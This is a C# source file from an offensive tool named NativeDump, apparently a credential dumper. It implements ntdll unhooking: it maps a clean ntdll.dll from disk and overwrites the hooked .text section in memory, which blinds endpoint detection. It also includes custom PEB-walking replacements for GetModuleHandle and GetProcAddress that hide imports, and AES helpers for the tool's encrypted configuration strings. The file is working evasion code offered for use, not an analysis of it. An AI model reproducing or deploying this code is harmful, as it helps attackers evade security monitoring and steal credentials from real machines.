using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using static NativeDump.Win32;


namespace NativeDump
{
    internal class Overwrite
    {
        public const uint GENERIC_READ = 0x80000000; // https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/262970b7-cd4a-41f4-8c4d-5a27f0092aaa
        public const uint FILE_SHARE_READ = 0x00000001;
        public const uint OPEN_EXISTING = 3; // https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea
        public const uint PAGE_READONLY = 0x02; // https://learn.microsoft.com/es-es/windows/win32/memory/memory-protection-constants
        public const uint SEC_IMAGE_NO_EXECUTE = 0x11000000; // https://learn.microsoft.com/es-es/windows/win32/api/winbase/nf-winbase-createfilemappinga
        public const uint FILE_MAP_READ = 4; // https://www.codeproject.com/Tips/79069/How-to-use-a-memory-mapped-file-with-Csharp-in-Win
        public const uint PAGE_EXECUTE_WRITECOPY = 0x80;
        public const uint FILE_ATTRIBUTE_NORMAL = 128;
        public const int offset_mappeddll = 4096;

        [DllImport("kernel32.dll", SetLastError = true)] public static extern IntPtr CreateFileA(string lpFileName, uint dwDesiredAccess, uint dwShareMode, uint lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, uint hTemplateFile);
        [DllImport("kernel32.dll", SetLastError = true)] public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32.dll", SetLastError = true)] public static extern IntPtr CreateFileMappingA(IntPtr hFile, uint lpFileMappingAttributes, uint flProtect, uint dwMaximumSizeHigh, uint dwMaximumSizeLow, string lpName);
        [DllImport("kernel32.dll", SetLastError = true)] public static extern IntPtr MapViewOfFile(IntPtr hFileMappingObject, uint dwDesiredAccess, uint dwFileOffsetHigh, uint dwFileOffsetLow, uint dwNumberOfBytesToMap);

        // Overwrite hooked ntdll .text section with a clean version
        static void ReplaceNtdllTxtSection(IntPtr unhookedNtdllTxt, IntPtr localNtdllTxt, int localNtdllTxtSize)
        {
            // VirtualProtect to PAGE_EXECUTE_WRITECOPY
            uint dwOldProtection;
            bool vp1_res = VirtualProtect(localNtdllTxt, (uint)localNtdllTxtSize, PAGE_EXECUTE_WRITECOPY, out dwOldProtection);
            if (!vp1_res)
            {
                Console.WriteLine("[-] Error calling VirtualProtect (PAGE_EXECUTE_WRITECOPY)");
                Environment.Exit(0);
            }

            // Copy from one address to the other
            unsafe
            {
                Buffer.MemoryCopy((void*)unhookedNtdllTxt, (void*)localNtdllTxt, localNtdllTxtSize, localNtdllTxtSize);
            }

            // VirtualProtect back to PAGE_EXECUTE_READ
            bool vp2_res = VirtualProtect(localNtdllTxt, (uint)localNtdllTxtSize, dwOldProtection, out dwOldProtection);
            if (!vp2_res)
            {
                Console.WriteLine("[-] Error calling VirtualProtect (dwOldProtection)");
                Environment.Exit(0);
            }
        }


        public static void PatchNtdll() {
            // NTDLL
            // Clean DLL
            Console.WriteLine("[+] Patching NTDLL.DLL");
            IntPtr unhookedNtdllTxt = IntPtr.Zero;
            string ntdll_path = "C:\\Windows\\System32\\ntdll.dll";
            IntPtr unhookedNtdllHandle = MapNtdllFromDisk(ntdll_path);
            Console.WriteLine("\t[+] Mapped Ntdll Handle [Disk]: \t\t0x" + unhookedNtdllHandle.ToString("X"));
            unhookedNtdllTxt = unhookedNtdllHandle + offset_mappeddll;
            Console.WriteLine("\t[+] Mapped Ntdll .Text Section [Disk]: \t\t0x" + unhookedNtdllTxt.ToString("X"));
            // Local DLL
            IntPtr localNtdllHandle = CustomGetModuleHandle("ntdll.dll");
            Console.WriteLine("\t[+] Local Ntdll Handle: \t\t\t0x" + localNtdllHandle.ToString("X"));
            int[] result = GetTextSectionInfo(localNtdllHandle);
            int localNtdllTxtBase = result[0];
            int localNtdllTxtSize = result[1];
            IntPtr localNtdllTxt = localNtdllHandle + localNtdllTxtBase;
            Console.WriteLine("\t[+] Local Ntdll Text Section: \t\t\t0x" + localNtdllTxt.ToString("X"));
            // Replace DLL
            Console.WriteLine("\t[+] Copying " + localNtdllTxtSize + " bytes from 0x" + unhookedNtdllTxt.ToString("X") + " to 0x" + localNtdllTxt.ToString("X"));
            ReplaceNtdllTxtSection(unhookedNtdllTxt, localNtdllTxt, localNtdllTxtSize);
        }


        // Map ntdl.dll from the file in disk and return view address
        public static IntPtr MapNtdllFromDisk(string ntdll_path)
        {
            IntPtr hFile = CreateFileA(ntdll_path, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
            
            // CreateFileA
            if (hFile == IntPtr.Zero)
            {
                Console.WriteLine("[-] Error calling CreateFileA");
                Environment.Exit(0);
            }
            // else{ Console.WriteLine("[+] File handle (CreateFileA): \t\t\t" + hFile); }

            // 	CreateFileMappingA
            IntPtr hSection = CreateFileMappingA(hFile, 0, PAGE_READONLY | SEC_IMAGE_NO_EXECUTE, 0, 0, "");
            if (hSection == IntPtr.Zero)
            {
                Console.WriteLine("[-] Error calling CreateFileMappingA");
                Environment.Exit(0);
            }
            // else{ Console.WriteLine("[+] Mapping handle (CreateFileMappingA): \t" + hSection); }

            // 	MapViewOfFile
            IntPtr pNtdllBuffer = MapViewOfFile(hSection, FILE_MAP_READ, 0, 0, 0);
            if (pNtdllBuffer == IntPtr.Zero)
            {
                Console.WriteLine("[-] Error calling MapViewOfFile");
                Environment.Exit(0);
            }
            //else{ Console.WriteLine("[+] View address (MapViewOfFile): \t\t0x" + pNtdllBuffer.ToString("x")); }

            // CloseHandle
            uint createfile_ch = NtClose(hFile);
            uint createfilemapping_ch = NtClose(hSection);
            if (createfile_ch != 0 || createfilemapping_ch != 0)
            {
                Console.WriteLine("[-] Error calling CloseHandle");
                Environment.Exit(0);
            }
            return pNtdllBuffer;
        }

        public static int[] GetTextSectionInfo(IntPtr ntdl_address)
        {
            IntPtr hProcess = System.Diagnostics.Process.GetCurrentProcess().Handle;

            // Check MZ Signature
            byte[] data = new byte[2];
            IntPtr signature_addr = ntdl_address;
            NtReadVirtualMemory(hProcess, signature_addr, data, data.Length, out _);
            string signature_dos_header = System.Text.Encoding.Default.GetString(data);
            if (signature_dos_header != "MZ")
            {
                Console.WriteLine("[-] Incorrect DOS header signature");
                Environment.Exit(0);
            }

            // e_lfanew in offset 0x3C in _IMAGE_DOS_HEADER structure, its size is 4 bytes 
            data = new byte[4];
            IntPtr e_lfanew_addr = ntdl_address + 0x3C;
            NtReadVirtualMemory(hProcess, e_lfanew_addr, data, 4, out _);
            int e_lfanew = BitConverter.ToInt32(data, 0);

            // Check PE Signature
            IntPtr image_nt_headers_addr = ntdl_address + e_lfanew;
            data = new byte[2];
            NtReadVirtualMemory(hProcess, image_nt_headers_addr, data, data.Length, out _);
            string signature_nt_header = System.Text.Encoding.Default.GetString(data);
            if (signature_nt_header != "PE")
            {
                Console.WriteLine("[-] Incorrect NT header signature");
                Environment.Exit(0);
            }

            // Check Optional Headers Magic field value
            IntPtr optional_headers_addr = image_nt_headers_addr + 24; // Marshal.SizeOf(typeof(UInt32)) + Marshal.SizeOf(typeof(IMAGE_FILE_HEADER)) = 24
            data = new byte[4];
            NtReadVirtualMemory(hProcess, optional_headers_addr, data, data.Length, out _);
            int optional_header_magic = BitConverter.ToInt16(data, 0);
            if (optional_header_magic != 0x20B && optional_header_magic != 0x10B)
            {
                Console.WriteLine("[-] Incorrect Optional Header Magic field value");
                Environment.Exit(0);
            }

            // SizeOfCode
            IntPtr sizeofcode_addr = optional_headers_addr + 4; // Uint16 (2 bytes) + Byte (1 byte) + Byte (1 byte) 
            data = new byte[4];
            NtReadVirtualMemory(hProcess, sizeofcode_addr, data, data.Length, out _);
            int sizeofcode = BitConverter.ToInt32(data, 0);

            // BaseOfCode
            IntPtr baseofcode_addr = optional_headers_addr + 20; // Uint16 (2 bytes) + 2 Byte (1 byte) + 4 Uint32 (4 byte) - public UInt16 Magic; public Byte MajorLinkerVersion; public Byte MinorLinkerVersion; public UInt32 SizeOfCode; public UInt32 SizeOfInitializedData; public UInt32 SizeOfUninitializedData; public UInt32 AddressOfEntryPoint; public UInt32 BaseOfCode;
            data = new byte[4];
            NtReadVirtualMemory(hProcess, baseofcode_addr, data, data.Length, out _);
            int baseofcode = BitConverter.ToInt32(data, 0);

            int[] result = { baseofcode, sizeofcode };
            return result;
        }


        // CustomGetModuleHandle may fail once if you call it hundreds of times
        public static IntPtr helperGetModuleHandle(String dll_name)
        {
            IntPtr dll_base = IntPtr.Zero;
            while (dll_base == IntPtr.Zero)
            {
                dll_base = CustomGetModuleHandle(dll_name);
            }
            return dll_base;
        }


        // CustomGetProcAddress may fail once if you call it hundreds of times
        public static IntPtr helperGetProcAddress(IntPtr dll_handle, String functioname)
        {
            IntPtr functionaddress = IntPtr.Zero;
            while (functionaddress == IntPtr.Zero)
            {
                functionaddress = CustomGetProcAddress(dll_handle, functioname);
            }
            return functionaddress;
        }


        // Custom implementation for GetModuleHandle
        public unsafe static IntPtr CustomGetModuleHandle(String dll_name)
        {
            uint process_basic_information_size = 48;
            int peb_offset = 0x8;
            int ldr_offset = 0x18;
            int inInitializationOrderModuleList_offset = 0x30;
            int flink_dllbase_offset = 0x20;
            int flink_buffer_offset = 0x50;
            // If 32-bit process these offsets change
            if (IntPtr.Size == 4)
            {
                process_basic_information_size = 24;
                peb_offset = 0x4;
                ldr_offset = 0x0c;
                inInitializationOrderModuleList_offset = 0x1c;
                flink_dllbase_offset = 0x18;
                flink_buffer_offset = 0x30;
            }

            // Get current process handle
            IntPtr hProcess = Process.GetCurrentProcess().Handle;

            // Create byte array with the size of the PROCESS_BASIC_INFORMATION structure
            byte[] pbi_byte_array = new byte[process_basic_information_size];

            // Create a PROCESS_BASIC_INFORMATION structure in the byte array
            IntPtr pbi_addr = IntPtr.Zero;
            fixed (byte* p = pbi_byte_array)
            {
                pbi_addr = (IntPtr)p;
                NtQueryInformationProcess(hProcess, 0x0, pbi_addr, process_basic_information_size, out _);
            }

            // Get PEB Base Address
            IntPtr peb_pointer = pbi_addr + peb_offset;
            IntPtr pebaddress = Marshal.ReadIntPtr(peb_pointer);

            // Get Ldr 
            IntPtr ldr_pointer = pebaddress + ldr_offset;
            IntPtr ldr_adress = Marshal.ReadIntPtr(ldr_pointer);

            // Get InInitializationOrderModuleList (LIST_ENTRY) inside _PEB_LDR_DATA struct
            IntPtr InInitializationOrderModuleList = ldr_adress + inInitializationOrderModuleList_offset;

            IntPtr next_flink = Marshal.ReadIntPtr(InInitializationOrderModuleList);
            IntPtr dll_base = (IntPtr)1337;
            while (dll_base != IntPtr.Zero)
            {
                next_flink = next_flink - 0x10;
                // Get DLL base address
                dll_base = Marshal.ReadIntPtr(next_flink + flink_dllbase_offset);
                IntPtr buffer = Marshal.ReadIntPtr(next_flink + flink_buffer_offset);
                // Get DLL name from buffer address
                String char_aux = null;
                String base_dll_name = "";
                while (char_aux != "")
                {
                    char_aux = Marshal.PtrToStringAnsi(buffer);
                    buffer += 2;
                    base_dll_name += char_aux;
                }
                next_flink = Marshal.ReadIntPtr(next_flink + 0x10);
                // Compare with DLL name we are searching
                if (dll_name.ToLower() == base_dll_name.ToLower())
                {
                    return dll_base;
                }
            }

            return IntPtr.Zero;
        }


        // Custom implementation for GetProcAddress
        public static IntPtr CustomGetProcAddress(IntPtr pDosHdr, String func_name)
        {
            // One offset changes between 32 and 64-bit processes
            int exportrva_offset = 136;
            if (IntPtr.Size == 4)
            {
                exportrva_offset = 120;
            }

            // Current process handle
            IntPtr hProcess = Process.GetCurrentProcess().Handle;

            // DOS header(IMAGE_DOS_HEADER)->e_lfanew
            IntPtr e_lfanew_addr = pDosHdr + (int)0x3C;
            byte[] e_lfanew_bytearr = new byte[4];
            NtReadVirtualMemory(hProcess, e_lfanew_addr, e_lfanew_bytearr, e_lfanew_bytearr.Length, out _);
            ulong e_lfanew_value = BitConverter.ToUInt32(e_lfanew_bytearr, 0);

            // NT Header (IMAGE_NT_HEADERS)->FileHeader(IMAGE_FILE_HEADER)->SizeOfOptionalHeader
            IntPtr sizeopthdr_addr = pDosHdr + (int)e_lfanew_value + 20;
            byte[] sizeopthdr_bytearr = new byte[2];
            NtReadVirtualMemory(hProcess, sizeopthdr_addr, sizeopthdr_bytearr, sizeopthdr_bytearr.Length, out _);
            ulong sizeopthdr_value = BitConverter.ToUInt16(sizeopthdr_bytearr, 0);
            int numberDataDirectory = ((int)sizeopthdr_value / 16) - 1;

            // exportTableRVA: Optional Header(IMAGE_OPTIONAL_HEADER64)->DataDirectory(IMAGE_DATA_DIRECTORY)[0]->VirtualAddress
            IntPtr exportTableRVA_addr = pDosHdr + (int)e_lfanew_value + exportrva_offset;
            byte[] exportTableRVA_bytearr = new byte[4];
            NtReadVirtualMemory(hProcess, exportTableRVA_addr, exportTableRVA_bytearr, exportTableRVA_bytearr.Length, out _);
            ulong exportTableRVA_value = BitConverter.ToUInt32(exportTableRVA_bytearr, 0);

            if (exportTableRVA_value != 0)
            {
                // NumberOfNames: ExportTable(IMAGE_EXPORT_DIRECTORY)->NumberOfNames
                IntPtr numberOfNames_addr = pDosHdr + (int)exportTableRVA_value + 0x18;
                byte[] numberOfNames_bytearr = new byte[4];
                NtReadVirtualMemory(hProcess, numberOfNames_addr, numberOfNames_bytearr, numberOfNames_bytearr.Length, out _);
                int numberOfNames_value = (int)BitConverter.ToUInt32(numberOfNames_bytearr, 0);

                // AddressOfFunctions: ExportTable(IMAGE_EXPORT_DIRECTORY)->AddressOfFunctions
                IntPtr addressOfFunctionsVRA_addr = pDosHdr + (int)exportTableRVA_value + 0x1C;
                byte[] addressOfFunctionsVRA_bytearr = new byte[4];
                NtReadVirtualMemory(hProcess, addressOfFunctionsVRA_addr, addressOfFunctionsVRA_bytearr, addressOfFunctionsVRA_bytearr.Length, out _);
                ulong addressOfFunctionsVRA_value = BitConverter.ToUInt32(addressOfFunctionsVRA_bytearr, 0);

                // AddressOfNames: ExportTable(IMAGE_EXPORT_DIRECTORY)->AddressOfNames
                IntPtr addressOfNamesVRA_addr = pDosHdr + (int)exportTableRVA_value + 0x20;
                byte[] addressOfNamesVRA_bytearr = new byte[4];
                NtReadVirtualMemory(hProcess, addressOfNamesVRA_addr, addressOfNamesVRA_bytearr, addressOfNamesVRA_bytearr.Length, out _);
                ulong addressOfNamesVRA_value = BitConverter.ToUInt32(addressOfNamesVRA_bytearr, 0);

                // AddressOfNameOrdinals: ExportTable(IMAGE_EXPORT_DIRECTORY)->AddressOfNameOrdinals
                IntPtr addressOfNameOrdinalsVRA_addr = pDosHdr + (int)exportTableRVA_value + 0x24;
                byte[] addressOfNameOrdinalsVRA_bytearr = new byte[4];
                NtReadVirtualMemory(hProcess, addressOfNameOrdinalsVRA_addr, addressOfNameOrdinalsVRA_bytearr, addressOfNameOrdinalsVRA_bytearr.Length, out _);
                ulong addressOfNameOrdinalsVRA_value = BitConverter.ToUInt32(addressOfNameOrdinalsVRA_bytearr, 0);

                IntPtr addressOfFunctionsRA = IntPtr.Add(pDosHdr, (int)addressOfFunctionsVRA_value);
                IntPtr addressOfNamesRA = IntPtr.Add(pDosHdr, (int)addressOfNamesVRA_value);
                IntPtr addressOfNameOrdinalsRA = IntPtr.Add(pDosHdr, (int)addressOfNameOrdinalsVRA_value);

                IntPtr auxaddressOfNamesRA = addressOfNamesRA;
                IntPtr auxaddressOfNameOrdinalsRA = addressOfNameOrdinalsRA;
                IntPtr auxaddressOfFunctionsRA = addressOfFunctionsRA;

                for (int i = 0; i < numberOfNames_value; i++)
                {
                    byte[] data5 = new byte[Marshal.SizeOf(typeof(UInt32))];
                    NtReadVirtualMemory(hProcess, auxaddressOfNamesRA, data5, data5.Length, out _);
                    UInt32 functionAddressVRA = (UInt32)BitConverter.ToUInt32(data5, 0);
                    IntPtr functionAddressRA = IntPtr.Add(pDosHdr, (int)functionAddressVRA);
                    byte[] data6 = new byte[func_name.Length];
                    NtReadVirtualMemory(hProcess, functionAddressRA, data6, data6.Length, out _);
                    String functionName = Encoding.ASCII.GetString(data6);
                    if (functionName == func_name)
                    {
                        // AdddressofNames --> AddressOfNamesOrdinals
                        byte[] data7 = new byte[Marshal.SizeOf(typeof(UInt16))];
                        NtReadVirtualMemory(hProcess, auxaddressOfNameOrdinalsRA, data7, data7.Length, out _);
                        UInt16 ordinal = (UInt16)BitConverter.ToUInt16(data7, 0);
                        // AddressOfNamesOrdinals --> AddressOfFunctions
                        auxaddressOfFunctionsRA += 4 * ordinal;
                        byte[] data8 = new byte[Marshal.SizeOf(typeof(UInt32))];
                        NtReadVirtualMemory(hProcess, auxaddressOfFunctionsRA, data8, data8.Length, out _);
                        UInt32 auxaddressOfFunctionsRAVal = (UInt32)BitConverter.ToUInt32(data8, 0);
                        IntPtr functionAddress = IntPtr.Add(pDosHdr, (int)auxaddressOfFunctionsRAVal);
                        return functionAddress;
                    }
                    auxaddressOfNamesRA += 4;
                    auxaddressOfNameOrdinalsRA += 2;
                }
            }
            return IntPtr.Zero;
        }


        // Enc String -> String
        public static string DecryptStringFromBytes(String cipherTextEncoded, byte[] Key, byte[] IV)
        {
            byte[] cipherText = Convert.FromBase64String(cipherTextEncoded);
            if (cipherText == null || cipherText.Length <= 0)
                throw new ArgumentNullException("cipherText");
            if (Key == null || Key.Length <= 0)
                throw new ArgumentNullException("Key");
            if (IV == null || IV.Length <= 0)
                throw new ArgumentNullException("IV");
            string plaintext = null;
            using (RijndaelManaged rijAlg = new RijndaelManaged())
            {
                rijAlg.Key = Key;
                rijAlg.IV = IV;
                ICryptoTransform decryptor = rijAlg.CreateDecryptor(rijAlg.Key, rijAlg.IV);
                using (MemoryStream msDecrypt = new MemoryStream(cipherText))
                {
                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                    {
                        using (StreamReader srDecrypt = new StreamReader(csDecrypt))
                        {
                            plaintext = srDecrypt.ReadToEnd();
                        }
                    }
                }

            }
            return plaintext;
        }


        // Used to generate AES-encrypted strings in Configuration.cs
        static String EncryptStringToBytes(string plainText, byte[] Key, byte[] IV)
        {
            if (plainText == null || plainText.Length <= 0)
                throw new ArgumentNullException("plainText");
            if (Key == null || Key.Length <= 0)
                throw new ArgumentNullException("Key");
            if (IV == null || IV.Length <= 0)
                throw new ArgumentNullException("IV");
            byte[] encrypted;
            using (RijndaelManaged rijAlg = new RijndaelManaged())
            {
                rijAlg.Key = Key;
                rijAlg.IV = IV;
                ICryptoTransform encryptor = rijAlg.CreateEncryptor(rijAlg.Key, rijAlg.IV);
                using (MemoryStream msEncrypt = new MemoryStream())
                {
                    using (CryptoStream csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
                    {
                        using (StreamWriter swEncrypt = new StreamWriter(csEncrypt))
                        {
                            swEncrypt.Write(plainText);
                        }
                        encrypted = msEncrypt.ToArray();
                    }
                }
            }
            return Convert.ToBase64String(encrypted);
        }
    }
}